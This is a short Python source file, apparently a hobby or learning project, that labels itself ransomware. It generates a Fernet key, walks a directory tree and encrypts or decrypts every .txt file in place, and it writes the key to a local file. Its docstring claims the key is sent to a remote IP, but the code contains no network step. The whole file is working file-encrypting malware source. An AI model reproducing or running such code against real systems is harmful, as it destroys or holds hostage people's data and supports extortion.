#this file is encrypt and decrypt
import os
from cryptography.fernet import Fernet
class ransomware(object):
    """
    I named this love sick ransomware
    this will encrypt all files in your system
    and send keys to specific ip address
    """
    def __init__(self,keyfile = None):
        if keyfile is not None:
            self.keyfile ="love sick girl"
            with open(keyfile,'rb') as f:
                self.key = f.read()
            self.cryptor = Fernet(self.key)
        else:
            self.keyfile = None
            self.key = Fernet.generate_key()
            self.cryptor = Fernet(self.key)
            self.create_key()

    def create_key(self):
        """
        send key somehow!
        """
        with open("keyfile",'wb+') as f:
            f.write(self.key)
    
    def encrypt(self,data):
        return self.cryptor.encrypt(data)

    def decrypt(self,data):
        return self.cryptor.decrypt(data)

    def path_traversal(self,path):
        for root, _, files in os.walk(path):
            for name in files:
                yield(os.path.join(root,name))

    def fileextcheck(self,path):
        for file in self.path_traversal(path):
            if not file.endswith("txt"):#encrypt only .txt
                continue
            with open(file,"rb+") as f:
                data = f.read()
                f.seek(0)
                f.truncate()
                if self.keyfile is not None:
                    f.write(self.decrypt(data))
                else:
                    f.write(self.encrypt(data))


def test():
    with open("datafile.txt", 'w') as f:
        f.write("what is this ? ")

    with open("datafile.txt", "rb+") as f:
        data = f.read()
        f.seek(0)
        f.truncate()
        f.write(rware.encrypt(data))

    with open("datafile.txt", "rb+") as f:
        data = f.read()
        f.seek(0)
        f.truncate()
        f.write(rware.decrypt(data))
if __name__ == "__main__":
    # don't confused attr of object with parameters
    rware = ransomware(keyfile="keyfile") #takes keyfile param out to encrypt
    rware.fileextcheck('.')#affect current dir